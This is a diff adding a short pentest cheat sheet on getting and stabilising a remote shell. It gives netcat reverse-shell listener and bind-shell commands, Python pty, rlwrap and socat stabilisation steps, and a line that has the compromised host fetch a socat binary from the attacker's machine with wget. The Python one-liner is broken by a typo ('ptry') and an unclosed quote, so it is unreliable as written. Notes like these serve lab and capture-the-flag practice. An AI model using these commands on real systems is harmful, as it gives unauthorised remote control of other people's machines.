@@ -1,0 +1,60 @@
+NETCAT : 
+
+    REVERSE SHELL ATTACKER LISTEN : nc -lvnp Port_Num
+
+    BIND SHELL ATTACKER CONNECT : nc Target_IP Port_Num
+
+
+STABALIZE WITH PYTHON : 
+
+    ON SHELL : 
+
+        python3 -c 'import pty;ptry.spawn("/bin/bash)'
+
+        export TERM=xterm
+
+        ctrl Z
+
+    ON ATTACKER TERMINAL : 
+
+        stty raw -echo;fg
+
+    RESET ATTACKER TERMINAL : reset
+
+
+STABALIZE WITH RLWRAP : 
+
+    INSTALL : sudo apt install rlwrap
+
+    ATTACKER LISTEN : 
+        
+        rlwrap nc -lvnp Port_Num
+
+        ctrl Z
+
+    ON ATTACKER TERMINAL : 
+
+        stty raw -echo;fg
+
+    RESET ATTACKER TERMINAL : reset
+    
+
+STABALIZE WITH SOCAT :
+
+    DOWNLOAD LINK ON ATTACKER : https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true
+
+    WEBSERVER SETUP ON ATTACKER : sudo python3 -m http.server 80
+
+    ON SHELL : wget Attacker_IP/Socat -O /tmp/socat
+
+
+ADJUST TERMINAL SIZE :
+
+    CHECK ATTACKER DEFAULT TERMINAL : stty -a
+
+    ON SHELL : 
+        
+        stty rows Above_Rows_Number
+
+        stty cols Above_Column_Number
+
